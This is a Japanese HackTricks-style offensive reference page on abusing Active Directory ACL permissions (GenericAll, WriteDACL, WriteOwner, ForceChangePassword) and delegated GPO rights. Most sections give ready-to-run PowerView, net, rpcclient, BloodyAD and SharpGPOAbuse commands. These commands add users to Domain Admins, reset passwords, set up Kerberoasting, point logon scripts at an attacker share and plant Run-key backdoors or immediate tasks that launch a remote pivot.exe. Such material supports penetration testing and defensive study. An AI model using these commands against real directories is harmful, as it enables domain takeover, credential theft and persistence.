# Active Directory ACLs/ACEs の悪用

{{#include ../../../banners/hacktricks-training.md}}

**このページは主に** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **および** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**の手法の要約です。詳細は元の記事を参照してください。**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **ユーザーに対する GenericAll 権限**

この権限は攻撃者にターゲットのユーザーアカウントに対する完全な制御を与えます。`Get-ObjectAcl` コマンドで `GenericAll` 権限が確認されると、攻撃者は次のことができます:

- **ターゲットのパスワードを変更する**: `net user <username> <password> /domain` を使用して、攻撃者はユーザーのパスワードをリセットできます。
- **Targeted Kerberoasting**: ユーザーのアカウントにSPNを割り当ててkerberoastableにし、次にRubeusとtargetedKerberoast.pyを使用してticket-granting ticket (TGT) ハッシュを抽出し、クラックを試みます。
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: ユーザーの pre-authentication を無効化し、そのアカウントを ASREPRoasting に対して脆弱にする。
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **グループに対する GenericAll 権限**

この権限により、攻撃者は `Domain Admins` のようなグループに対して `GenericAll` 権限を持っている場合、グループのメンバーシップを操作できます。`Get-NetGroup` でグループの識別名（distinguished name）を特定した後、攻撃者は以下のことができます:

- **自分自身を `Domain Admins` グループに追加する**: これは直接コマンドで行うか、Active Directory や PowerSploit のようなモジュールを使用して行えます。
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Linux上からでもBloodyADを使い、対象グループに対してGenericAll/Writeのメンバーシップを持っていれば任意のグループに自分を追加できます。もし対象グループが“Remote Management Users”にネストされている場合、そのグループを有効にしているホストでは即座にWinRMアクセスを得られます:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

コンピューターオブジェクトまたはユーザーアカウントでこれらの権限を保持していると、以下が可能になります：

- **Kerberos Resource-based Constrained Delegation**: コンピューターオブジェクトを乗っ取ることができます。
- **Shadow Credentials**: この技術を使用して、権限を悪用して shadow credentials を作成することで、コンピューターやユーザーアカウントを偽装できます。

## **WriteProperty on Group**

特定のグループ（例: `Domain Admins`）のすべてのオブジェクトに対して`WriteProperty`権限を持っている場合、以下が可能になります：

- **自分を `Domain Admins` グループに追加する**: `net user` と `Add-NetGroupUser` コマンドを組み合わせて実行することで実現可能で、この方法はドメイン内での権限昇格を可能にします。
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **グループに対する Self（自己メンバーシップ）**

この権限により、攻撃者はグループメンバーシップを直接操作するコマンドを使って、自分自身を `Domain Admins` のような特定のグループに追加できます。次のコマンド列を使用すると自己追加が可能です：
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

同様の権限で、対象グループに対して `WriteProperty` 権限を持っている場合、攻撃者はグループのプロパティを変更して自身を直接グループに追加できます。この権限の確認と実行は以下で行われます：
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

ユーザーに対して `User-Force-Change-Password` の `ExtendedRight` を持っていると、現在のパスワードを知らなくてもパスワードをリセットできます。 この権利の検証と悪用は PowerShell やその他のコマンドラインツールで行うことができ、対話型セッションや非対話環境向けのワンライナーを含む複数の方法でユーザーのパスワードをリセットできます。 コマンドは単純な PowerShell 呼び出しから Linux 上の `rpcclient` を使うものまであり、attack vectors の多様性を示しています。
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **グループの WriteOwner**

攻撃者があるグループに対して `WriteOwner` 権限を持っていることを発見した場合、グループの所有者を自分自身に変更できます。これは対象のグループが `Domain Admins` の場合に特に影響が大きく、所有権を変更することでグループ属性やメンバーシップに対するより広範な制御が可能になります。プロセスは、まず `Get-ObjectAcl` で対象オブジェクトを特定し、次に `Set-DomainObjectOwner` を使用して SID または名前で所有者を変更する、という手順になります。
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

この権限により、攻撃者はユーザーのプロパティを変更できます。具体的には、`GenericWrite` アクセスがあれば、攻撃者はユーザーのログオンスクリプトパスを変更して、ユーザーのログオン時に悪意のあるスクリプトを実行させることができます。これは、`Set-ADObject` コマンドを使用して対象ユーザーの `scriptpath` プロパティを攻撃者のスクリプトを指すように更新することで実現します。
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

この権限があれば、攻撃者はグループのメンバーシップを操作できます。例えば、自分自身や他のユーザーを特定のグループに追加することが可能です。このプロセスは、資格情報オブジェクトを作成し、それを使ってユーザーをグループに追加または削除し、PowerShell コマンドでメンバーシップの変更を検証することを含みます。
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

AD オブジェクトを所有し、そのオブジェクトに対して `WriteDACL` 権限を持っていると、攻撃者はそのオブジェクトに対して自分自身に `GenericAll` 権限を付与することができます。これは ADSI 操作によって実現され、オブジェクトの完全な制御とグループメンバーシップの変更が可能になります。とはいえ、Active Directory モジュールの `Set-Acl` / `Get-Acl` cmdlets を使用してこれらの権限を悪用しようとする際には制限があります。
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **ドメイン上のレプリケーション (DCSync)**

DCSync attackは、ドメイン上の特定のレプリケーション権限を利用してDomain Controllerを模倣し、ユーザー資格情報を含むデータを同期します。この強力な手法は `DS-Replication-Get-Changes` のような権限を必要とし、攻撃者がDomain Controllerに直接アクセスせずにAD環境から機密情報を抽出できるようにします。 [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPOの委任 <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPOの委任

Group Policy Objects (GPOs) の管理を委任されたアクセスは重大なセキュリティリスクを招く可能性があります。例えば、`offense\spotless` のようなユーザーにGPO管理権限が委任されている場合、**WriteProperty**, **WriteDacl**, **WriteOwner** といった権限を持つことがあります。これらの権限は悪用され得るもので、PowerViewを使って次のように確認できます: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### GPO権限の列挙

誤設定されたGPOを特定するには、PowerSploitのcmdletを連結して使用できます。これにより、特定のユーザーが管理権限を持つGPOを発見できます: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**特定のポリシーが適用されているコンピュータ**: 特定のGPOがどのコンピュータに適用されているかを解決して、潜在的な影響範囲を把握できます。 `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**特定のコンピュータに適用されているポリシー**: 特定のコンピュータにどのポリシーが適用されているかを確認するには、`Get-DomainGPO` のようなコマンドを使用します。

**特定のポリシーが適用されているOU**: 指定されたポリシーによって影響を受ける組織単位（OU）を特定するには、`Get-DomainOU` を使用できます。

また [**GPOHound**](https://github.com/cogiceo/GPOHound) を使用して GPO を列挙し、問題を見つけることもできます。

### Abuse GPO - New-GPOImmediateTask

誤設定されたGPOはコード実行に悪用される可能性があり、例えば即時スケジュールされたタスクを作成することで実行できます。これにより、影響を受けるマシンのローカル管理者グループにユーザーを追加して権限を大幅に昇格させることができます:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy moduleがインストールされていると、新しいGPOsの作成とリンク、そして影響を受けたコンピュータ上でbackdoorsを実行するためのregistry valuesなどの設定が可能になります。この方法はGPOが更新され、実行のためにユーザーがコンピュータにログインすることを必要とします:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse は、既存の GPOs を新たに作成することなく、タスクを追加したり設定を変更したりして既存の GPOs を悪用する方法を提供します。  
このツールを使用するには、変更を適用する前に既存の GPOs を修正するか、RSAT ツールを使用して新しい GPOs を作成する必要があります:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### ポリシー更新を強制する

GPO の更新は通常約 90 分ごとに行われます。変更を適用した直後にプロセスを早めたい場合、ターゲットコンピュータ上で `gpupdate /force` を実行して即時のポリシー更新を強制できます。このコマンドにより、次の自動更新サイクルを待たずに GPO の変更が適用されます。

### 内部の仕組み

特定の GPO の Scheduled Tasks を確認すると、`Misconfigured Policy` のような GPO 内に `evilTask` といったタスクが追加されていることが確認できます。これらのタスクは、システム動作を変更したり権限昇格を狙ったりするスクリプトやコマンドラインツールによって作成されます。

`New-GPOImmediateTask` によって生成される XML 構成ファイルに示されるタスクの構造は、実行されるコマンドやトリガーなど、スケジュールされたタスクの詳細を示しています。このファイルは GPO 内でスケジュールタスクがどのように定義・管理されるかを表しており、ポリシー適用の一環として任意のコマンドやスクリプトを実行する手段を提供します。

### Users and Groups

GPO はターゲットシステム上のユーザーやグループメンバーシップの操作も可能にします。Users and Groups ポリシーファイルを直接編集することで、攻撃者はローカルの `administrators` グループなどの特権グループにユーザーを追加できます。これは、GPO 管理権限の委任によりポリシーファイルを変更して新しいユーザーを含めたりグループメンバーシップを変更したりすることが許可されているためです。

Users and Groups の XML 構成ファイルは、これらの変更がどのように実装されるかを示しています。このファイルにエントリを追加することで、特定のユーザーに対して影響を受けるシステム全体で昇格した権限を付与できます。この手法は、GPO 操作を通じた直接的な権限昇格の方法を提供します。

さらに、logon/logoff scripts の活用、registry keys for autoruns の変更、.msi files を使ったソフトウェアのインストール、service configurations の編集など、コード実行や永続化のための追加手段も考えられます。これらの技術は、GPO の悪用によってアクセスを維持しターゲットシステムを制御する多様な経路を提供します。

## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
